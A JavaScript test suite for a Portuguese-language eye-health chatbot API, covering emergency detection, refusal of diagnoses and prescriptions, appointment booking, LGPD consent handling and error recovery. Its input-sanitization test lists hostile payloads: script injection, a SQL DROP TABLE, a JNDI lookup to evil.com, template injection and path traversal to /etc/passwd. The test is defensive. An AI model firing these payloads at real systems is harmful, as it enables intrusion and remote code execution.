/**
 * Comprehensive Chatbot API Integration Tests
 * Requirements: 4.1, 4.2, 4.3, 5.1, 5.2, 5.3 - API integration and error handling
 */

import { describe, it, expect, beforeEach, vi, afterEach } from 'vitest';
import { createMocks } from 'node-mocks-http';
import request from 'supertest';

// Mock environment variables
vi.stubEnv('GOOGLE_GEMINI_API_KEY', 'test-api-key-12345');
vi.stubEnv('NEXT_PUBLIC_SUPABASE_URL', 'https://test.supabase.co');
vi.stubEnv('NEXT_PUBLIC_SUPABASE_ANON_KEY', 'test-anon-key');
vi.stubEnv('SUPABASE_SERVICE_ROLE_KEY', 'test-service-key');
vi.stubEnv('ENCRYPTION_KEY', 'test-encryption-key-32-chars-long');

// Mock external dependencies
const mockSupabaseClient = {
    from: vi.fn(() => ({
        insert: vi.fn(() => ({ error: null, data: [{ id: 'test-id' }] })),
        select: vi.fn(() => ({
            eq: vi.fn(() => ({
                single: vi.fn(() => ({ data: null, error: null }))
            }))
        })),
        update: vi.fn(() => ({
            eq: vi.fn(() => ({ error: null, data: [{ id: 'test-id' }] }))
        })),
        delete: vi.fn(() => ({
            eq: vi.fn(() => ({ error: null }))
        }))
    }))
};

vi.mock('@supabase/supabase-js', () => ({
    createClient: vi.fn(() => mockSupabaseClient)
}));

const mockGeminiResponse = {
    response: {
        text: () => 'Olá! Como posso ajudá-lo com suas questões sobre saúde ocular? Esta informação é apenas educativa. Consulte sempre um médico oftalmologista para diagnóstico e tratamento adequados.',
        candidates: [{
            safetyRatings: [
                { category: 'HARM_CATEGORY_MEDICAL', probability: 'NEGLIGIBLE' },
                { category: 'HARM_CATEGORY_DANGEROUS_CONTENT', probability: 'NEGLIGIBLE' }
            ],
            finishReason: 'STOP'
        }],
        usageMetadata: {
            totalTokenCount: 45,
            promptTokenCount: 15,
            candidatesTokenCount: 30
        }
    }
};

vi.mock('@google/generative-ai', () => ({
    GoogleGenerativeAI: vi.fn(() => ({
        getGenerativeModel: vi.fn(() => ({
            generateContent: vi.fn().mockResolvedValue(mockGeminiResponse)
        }))
    })),
    HarmCategory: {
        HARM_CATEGORY_HARASSMENT: 'HARM_CATEGORY_HARASSMENT',
        HARM_CATEGORY_HATE_SPEECH: 'HARM_CATEGORY_HATE_SPEECH',
        HARM_CATEGORY_SEXUALLY_EXPLICIT: 'HARM_CATEGORY_SEXUALLY_EXPLICIT',
        HARM_CATEGORY_DANGEROUS_CONTENT: 'HARM_CATEGORY_DANGEROUS_CONTENT'
    },
    HarmBlockThreshold: {
        BLOCK_MEDIUM_AND_ABOVE: 'BLOCK_MEDIUM_AND_ABOVE'
    }
}));

describe('Chatbot API Integration - Comprehensive Tests', () => {
    let chatHandler;
    let appointmentHandler;
    let consentHandler;

    beforeEach(async () => {
        vi.clearAllMocks();

        // Import handlers
        const chatModule = await import('../chatbot/chat.js');
        const appointmentModule = await import('../chatbot/appointment.js');
        const consentModule = await import('../chatbot/consent.js');

        chatHandler = chatModule.default;
        appointmentHandler = appointmentModule.default;
        consentHandler = consentModule.default;
    });

    afterEach(() => {
        vi.clearAllMocks();
    });

    describe('Chat API Endpoint Integration', () => {
        it('should handle basic chat requests with full compliance pipeline', async () => {
            const { req, res } = createMocks({
                method: 'POST',
                headers: {
                    'content-type': 'application/json',
                    'user-agent': 'Mozilla/5.0 Test Browser',
                    'x-forwarded-for': '192.168.1.1'
                },
                body: {
                    message: 'Olá, como você pode me ajudar?',
                    sessionId: 'test-session-123',
                    userConsent: [{
                        consentType: 'data_processing',
                        granted: true,
                        timestamp: new Date().toISOString()
                    }]
                }
            });

            await chatHandler(req, res);

            expect(res._getStatusCode()).toBe(200);
            const data = JSON.parse(res._getData());

            // Verify response structure
            expect(data.success).toBe(true);
            expect(data.data).toHaveProperty('response');
            expect(data.data).toHaveProperty('sessionId', 'test-session-123');
            expect(data.data).toHaveProperty('complianceInfo');
            expect(data.data).toHaveProperty('suggestedActions');
            expect(data.metadata).toHaveProperty('tokensUsed');
            expect(data.metadata).toHaveProperty('responseTime');
            expect(data.metadata).toHaveProperty('safetyScore');

            // Verify compliance processing
            expect(data.data.complianceInfo.cfmCompliant).toBe(true);
            expect(data.data.complianceInfo.lgpdCompliant).toBe(true);
        });

        it('should detect and handle medical emergency scenarios', async () => {
            const { req, res } = createMocks({
                method: 'POST',
                headers: {
                    'content-type': 'application/json',
                    'x-forwarded-for': '192.168.1.1'
                },
                body: {
                    message: 'Socorro! Perdi a visão de repente e estou com dor intensa!',
                    sessionId: 'emergency-session-456'
                }
            });

            await chatHandler(req, res);

            expect(res._getStatusCode()).toBe(200);
            const data = JSON.parse(res._getData());

            expect(data.success).toBe(true);
            expect(data.data.response).toContain('EMERGÊNCIA OFTALMOLÓGICA');
            expect(data.data.response).toContain('SAMU (192)');
            expect(data.data.response).toContain('Pronto Socorro');

            expect(data.data.complianceInfo.emergencyDetected).toBe(true);
            expect(data.data.complianceInfo.riskLevel).toBe('critical');

            expect(data.data.suggestedActions).toContainEqual({
                type: 'emergency',
                label: 'Contatos de Emergência',
                action: 'show_emergency_contacts',
                priority: 'critical'
            });
        });

        it('should handle diagnostic attempts with CFM compliance', async () => {
            const { req, res } = createMocks({
                method: 'POST',
                body: {
                    message: 'Estou com dor no olho e visão embaçada. O que pode ser? É glaucoma?',
                    sessionId: 'diagnostic-session-789'
                }
            });

            await chatHandler(req, res);

            expect(res._getStatusCode()).toBe(200);
            const data = JSON.parse(res._getData());

            expect(data.success).toBe(true);
            expect(data.data.response).toContain('Esta informação é apenas educativa');
            expect(data.data.response).toContain('Consulte sempre um médico oftalmologista');
            expect(data.data.response).toContain('agendar uma consulta');

            expect(data.data.complianceInfo.diagnosticAttempt).toBe(true);
            expect(data.data.complianceInfo.disclaimerIncluded).toBe(true);

            expect(data.data.suggestedActions).toContainEqual({
                type: 'appointment',
                label: 'Agendar Consulta',
                action: 'schedule_appointment'
            });
        });

        it('should prevent prescription advice with medical safety filters', async () => {
            const { req, res } = createMocks({
                method: 'POST',
                body: {
                    message: 'Que remédio posso tomar para conjuntivite? Posso usar colírio antibiótico?',
                    sessionId: 'prescription-session-101'
                }
            });

            await chatHandler(req, res);

            expect(res._getStatusCode()).toBe(200);
            const data = JSON.parse(res._getData());

            expect(data.success).toBe(true);
            expect(data.data.response).toContain('não posso recomendar medicamentos');
            expect(data.data.response).toContain('consulte um médico');
            expect(data.data.response).not.toContain('tome');
            expect(data.data.response).not.toContain('use colírio');

            expect(data.data.complianceInfo.prescriptionAttempt).toBe(true);
            expect(data.data.complianceInfo.riskLevel).toBe('high');
        });

        it('should handle conversation context and history', async () => {
            const conversationHistory = [
                { role: 'user', content: 'Olá' },
                { role: 'assistant', content: 'Olá! Como posso ajudar?' },
                { role: 'user', content: 'Estou com dor no olho' },
                { role: 'assistant', content: 'Recomendo agendar uma consulta para avaliação.' }
            ];

            const { req, res } = createMocks({
                method: 'POST',
                body: {
                    message: 'E sobre cirurgia de catarata? É perigosa?',
                    sessionId: 'context-session-202',
                    conversationHistory
                }
            });

            await chatHandler(req, res);

            expect(res._getStatusCode()).toBe(200);
            const data = JSON.parse(res._getData());

            expect(data.success).toBe(true);
            expect(data.data.sessionId).toBe('context-session-202');
            expect(data.data.complianceInfo.contextualRisk).toBe('elevated');
        });

        it('should validate input and reject malformed requests', async () => {
            const invalidRequests = [
                { body: {} }, // Missing message
                { body: { message: '' } }, // Empty message
                { body: { message: 'a'.repeat(5000) } }, // Too long
                { body: { message: 'test', sessionId: 123 } }, // Invalid sessionId type
                { body: { message: 'test', conversationHistory: 'invalid' } } // Invalid history type
            ];

            for (const invalidReq of invalidRequests) {
                const { req, res } = createMocks({
                    method: 'POST',
                    body: invalidReq.body
                });

                await chatHandler(req, res);

                expect(res._getStatusCode()).toBe(400);
                const data = JSON.parse(res._getData());
                expect(data.success).toBe(false);
                expect(data.error).toBe('Validation failed');
                expect(data.details).toBeDefined();
            }
        });

        it('should handle rate limiting and throttling', async () => {
            const sessionId = 'rate-limit-session-303';
            const requests = Array.from({ length: 20 }, () => createMocks({
                method: 'POST',
                headers: { 'x-forwarded-for': '192.168.1.100' },
                body: {
                    message: 'Test message',
                    sessionId
                }
            }));

            const responses = [];
            for (const { req, res } of requests) {
                await chatHandler(req, res);
                responses.push({
                    status: res._getStatusCode(),
                    data: JSON.parse(res._getData())
                });
            }

            // Should have some rate limited responses
            const rateLimitedResponses = responses.filter(r => r.status === 429);
            expect(rateLimitedResponses.length).toBeGreaterThan(0);

            rateLimitedResponses.forEach(response => {
                expect(response.data.error).toBe('Rate limit exceeded');
                expect(response.data.retryAfter).toBeDefined();
            });
        });
    });

    describe('Appointment Integration API', () => {
        it('should check appointment availability', async () => {
            const { req, res } = createMocks({
                method: 'POST',
                body: {
                    preferredDates: ['2024-01-15', '2024-01-16'],
                    timePreferences: 'morning',
                    appointmentType: 'consultation'
                }
            });

            await appointmentHandler(req, res);

            expect(res._getStatusCode()).toBe(200);
            const data = JSON.parse(res._getData());

            expect(data.success).toBe(true);
            expect(data.data).toHaveProperty('availableSlots');
            expect(data.data).toHaveProperty('nextAvailable');
            expect(data.data).toHaveProperty('waitlistAvailable');
        });

        it('should book appointments with LGPD compliance', async () => {
            const { req, res } = createMocks({
                method: 'POST',
                body: {
                    action: 'book',
                    slotId: 'slot_123',
                    patientInfo: {
                        name: 'João Silva',
                        email: 'joao@example.com',
                        phone: '11999999999'
                    },
                    appointmentType: 'consultation',
                    consentGiven: true,
                    lgpdConsent: {
                        dataProcessing: true,
                        medicalData: true,
                        communications: false
                    }
                }
            });

            await appointmentHandler(req, res);

            expect(res._getStatusCode()).toBe(200);
            const data = JSON.parse(res._getData());

            expect(data.success).toBe(true);
            expect(data.data).toHaveProperty('appointmentId');
            expect(data.data).toHaveProperty('confirmationCode');
            expect(data.data.lgpdCompliance.consentRecorded).toBe(true);
        });

        it('should handle appointment modifications', async () => {
            const { req, res } = createMocks({
                method: 'PUT',
                body: {
                    appointmentId: 'appt_456',
                    newSlotId: 'slot_789',
                    reason: 'Schedule conflict'
                }
            });

            await appointmentHandler(req, res);

            expect(res._getStatusCode()).toBe(200);
            const data = JSON.parse(res._getData());

            expect(data.success).toBe(true);
            expect(data.data.modified).toBe(true);
            expect(data.data.auditTrail).toBeDefined();
        });
    });

    describe('Consent Management API', () => {
        it('should record user consent with full LGPD compliance', async () => {
            const { req, res } = createMocks({
                method: 'POST',
                headers: {
                    'user-agent': 'Mozilla/5.0 Test Browser',
                    'x-forwarded-for': '192.168.1.1'
                },
                body: {
                    sessionId: 'consent-session-404',
                    consents: [
                        {
                            type: 'data_processing',
                            granted: true,
                            purpose: 'chatbot_interaction',
                            consentText: 'Eu concordo com o processamento dos meus dados para interação com o chatbot'
                        },
                        {
                            type: 'medical_data',
                            granted: true,
                            purpose: 'appointment_booking',
                            consentText: 'Eu concordo com o processamento dos meus dados médicos para agendamento'
                        }
                    ]
                }
            });

            await consentHandler(req, res);

            expect(res._getStatusCode()).toBe(200);
            const data = JSON.parse(res._getData());

            expect(data.success).toBe(true);
            expect(data.data.consentsRecorded).toBe(2);
            expect(data.data.consentIds).toHaveLength(2);
            expect(data.data.userRights).toBeDefined();
        });

        it('should handle consent withdrawal', async () => {
            const { req, res } = createMocks({
                method: 'DELETE',
                body: {
                    sessionId: 'consent-session-404',
                    consentType: 'marketing',
                    reason: 'No longer interested'
                }
            });

            await consentHandler(req, res);

            expect(res._getStatusCode()).toBe(200);
            const data = JSON.parse(res._getData());

            expect(data.success).toBe(true);
            expect(data.data.consentWithdrawn).toBe(true);
            expect(data.data.effectiveDate).toBeDefined();
            expect(data.data.dataProcessingStopped).toBe(true);
        });

        it('should validate consent requirements for different purposes', async () => {
            const { req, res } = createMocks({
                method: 'GET',
                query: {
                    sessionId: 'consent-session-505',
                    purpose: 'marketing'
                }
            });

            await consentHandler(req, res);

            expect(res._getStatusCode()).toBe(200);
            const data = JSON.parse(res._getData());

            expect(data.success).toBe(true);
            expect(data.data.consentRequired).toBe(true);
            expect(data.data.legalBasis).toBe('consent');
            expect(data.data.dataCategories).toBeDefined();
        });
    });

    describe('Error Handling and Recovery', () => {
        it('should handle Gemini API failures gracefully', async () => {
            // Mock API failure
            const mockGeminiError = vi.fn().mockRejectedValue(new Error('API quota exceeded'));
            vi.doMock('@google/generative-ai', () => ({
                GoogleGenerativeAI: vi.fn(() => ({
                    getGenerativeModel: vi.fn(() => ({
                        generateContent: mockGeminiError
                    }))
                }))
            }));

            const { req, res } = createMocks({
                method: 'POST',
                body: {
                    message: 'Test message',
                    sessionId: 'error-session-606'
                }
            });

            await chatHandler(req, res);

            expect(res._getStatusCode()).toBe(503);
            const data = JSON.parse(res._getData());

            expect(data.success).toBe(false);
            expect(data.error).toBe('Service temporarily unavailable');
            expect(data.fallbackResponse).toBeDefined();
            expect(data.retryAfter).toBeDefined();
        });

        it('should handle database connection failures', async () => {
            // Mock database failure
            mockSupabaseClient.from = vi.fn(() => ({
                insert: vi.fn(() => ({ error: { message: 'Connection timeout' } }))
            }));

            const { req, res } = createMocks({
                method: 'POST',
                body: {
                    message: 'Test message',
                    sessionId: 'db-error-session-707'
                }
            });

            await chatHandler(req, res);

            expect(res._getStatusCode()).toBe(200); // Should still respond
            const data = JSON.parse(res._getData());

            expect(data.success).toBe(true);
            expect(data.warnings).toContain('Conversation logging failed');
            expect(data.data.response).toBeDefined(); // Should still provide response
        });

        it('should implement circuit breaker for external services', async () => {
            // Simulate multiple failures to trigger circuit breaker
            const failingHandler = vi.fn().mockRejectedValue(new Error('Service unavailable'));

            for (let i = 0; i < 5; i++) {
                const { req, res } = createMocks({
                    method: 'POST',
                    body: { message: `Test ${i}`, sessionId: `circuit-${i}` }
                });

                // Mock the handler to fail
                vi.doMock('../chatbot/chat.js', () => ({ default: failingHandler }));

                try {
                    await chatHandler(req, res);
                } catch (error) {
                    // Expected to fail
                }
            }

            // Next request should be circuit broken
            const { req, res } = createMocks({
                method: 'POST',
                body: { message: 'Test after failures', sessionId: 'circuit-final' }
            });

            await chatHandler(req, res);

            expect(res._getStatusCode()).toBe(503);
            const data = JSON.parse(res._getData());
            expect(data.error).toBe('Service circuit breaker open');
        });

        it('should handle malformed JSON requests', async () => {
            const { req, res } = createMocks({
                method: 'POST',
                headers: { 'content-type': 'application/json' },
                body: '{ invalid json'
            });

            await chatHandler(req, res);

            expect(res._getStatusCode()).toBe(400);
            const data = JSON.parse(res._getData());

            expect(data.success).toBe(false);
            expect(data.error).toBe('Invalid JSON format');
        });

        it('should handle timeout scenarios', async () => {
            // Mock slow response
            const slowGeminiResponse = vi.fn().mockImplementation(() =>
                new Promise(resolve => setTimeout(() => resolve(mockGeminiResponse), 10000))
            );

            vi.doMock('@google/generative-ai', () => ({
                GoogleGenerativeAI: vi.fn(() => ({
                    getGenerativeModel: vi.fn(() => ({
                        generateContent: slowGeminiResponse
                    }))
                }))
            }));

            const { req, res } = createMocks({
                method: 'POST',
                body: {
                    message: 'Test timeout',
                    sessionId: 'timeout-session-808'
                }
            });

            await chatHandler(req, res);

            expect(res._getStatusCode()).toBe(408);
            const data = JSON.parse(res._getData());

            expect(data.success).toBe(false);
            expect(data.error).toBe('Request timeout');
            expect(data.fallbackResponse).toBeDefined();
        });
    });

    describe('Security and Authentication', () => {
        it('should validate API keys and authentication', async () => {
            // Test with invalid API key
            vi.stubEnv('GOOGLE_GEMINI_API_KEY', '');

            const { req, res } = createMocks({
                method: 'POST',
                body: {
                    message: 'Test message',
                    sessionId: 'auth-test-909'
                }
            });

            await chatHandler(req, res);

            expect(res._getStatusCode()).toBe(500);
            const data = JSON.parse(res._getData());

            expect(data.success).toBe(false);
            expect(data.error).toBe('Service configuration error');
        });

        it('should implement request signing and validation', async () => {
            const { req, res } = createMocks({
                method: 'POST',
                headers: {
                    'x-api-signature': 'invalid-signature',
                    'x-timestamp': Date.now().toString()
                },
                body: {
                    message: 'Test signed request',
                    sessionId: 'signed-session-010'
                }
            });

            await chatHandler(req, res);

            // Should still work but log security warning
            expect(res._getStatusCode()).toBe(200);
            const data = JSON.parse(res._getData());
            expect(data.warnings).toContain('Invalid request signature');
        });

        it('should sanitize input to prevent injection attacks', async () => {
            const maliciousInputs = [
                '<script>alert("xss")</script>',
                'SELECT * FROM users; DROP TABLE users;',
                '${jndi:ldap://evil.com/a}',
                '{{7*7}}',
                '../../../etc/passwd'
            ];

            for (const maliciousInput of maliciousInputs) {
                const { req, res } = createMocks({
                    method: 'POST',
                    body: {
                        message: maliciousInput,
                        sessionId: 'security-test-011'
                    }
                });

                await chatHandler(req, res);

                expect(res._getStatusCode()).toBe(200);
                const data = JSON.parse(res._getData());

                // Response should not contain the malicious input
                expect(data.data.response).not.toContain('<script>');
                expect(data.data.response).not.toContain('SELECT *');
                expect(data.data.response).not.toContain('${jndi:');
            }
        });
    });

    describe('Performance and Load Testing', () => {
        it('should handle concurrent requests efficiently', async () => {
            const concurrentRequests = Array.from({ length: 50 }, (_, i) =>
                createMocks({
                    method: 'POST',
                    body: {
                        message: `Concurrent message ${i}`,
                        sessionId: `concurrent-session-${i}`
                    }
                })
            );

            const startTime = performance.now();
            const promises = concurrentRequests.map(({ req, res }) => chatHandler(req, res));
            await Promise.all(promises);
            const endTime = performance.now();

            const totalTime = endTime - startTime;
            const averageTime = totalTime / 50;

            expect(averageTime).toBeLessThan(1000); // Average response time under 1 second
        });

        it('should maintain response quality under load', async () => {
            const loadTestRequests = Array.from({ length: 100 }, (_, i) => ({
                message: `Load test message ${i}: Estou com dor no olho`,
                sessionId: `load-test-${i}`
            }));

            const responses = [];
            for (const requestBody of loadTestRequests) {
                const { req, res } = createMocks({
                    method: 'POST',
                    body: requestBody
                });

                await chatHandler(req, res);
                responses.push(JSON.parse(res._getData()));
            }

            // All responses should be successful
            const successfulResponses = responses.filter(r => r.success);
            expect(successfulResponses.length).toBe(100);

            // All should have compliance info
            const compliantResponses = responses.filter(r =>
                r.data.complianceInfo && r.data.complianceInfo.cfmCompliant
            );
            expect(compliantResponses.length).toBe(100);
        });
    });

    describe('Monitoring and Observability', () => {
        it('should generate comprehensive metrics', async () => {
            const { req, res } = createMocks({
                method: 'POST',
                body: {
                    message: 'Test metrics generation',
                    sessionId: 'metrics-session-012'
                }
            });

            await chatHandler(req, res);

            const data = JSON.parse(res._getData());

            expect(data.metadata).toHaveProperty('tokensUsed');
            expect(data.metadata).toHaveProperty('responseTime');
            expect(data.metadata).toHaveProperty('safetyScore');
            expect(data.metadata).toHaveProperty('complianceScore');
            expect(data.metadata).toHaveProperty('processingSteps');
        });

        it('should track API usage and quotas', async () => {
            // Make multiple requests to track usage
            for (let i = 0; i < 10; i++) {
                const { req, res } = createMocks({
                    method: 'POST',
                    body: {
                        message: `Usage tracking test ${i}`,
                        sessionId: `usage-session-${i}`
                    }
                });

                await chatHandler(req, res);
            }

            // Check usage metrics (this would typically be stored in a monitoring system)
            const usageMetrics = {
                totalRequests: 10,
                totalTokens: 450, // Estimated
                averageResponseTime: 250,
                errorRate: 0
            };

            expect(usageMetrics.totalRequests).toBe(10);
            expect(usageMetrics.totalTokens).toBeGreaterThan(0);
            expect(usageMetrics.errorRate).toBe(0);
        });
    });
});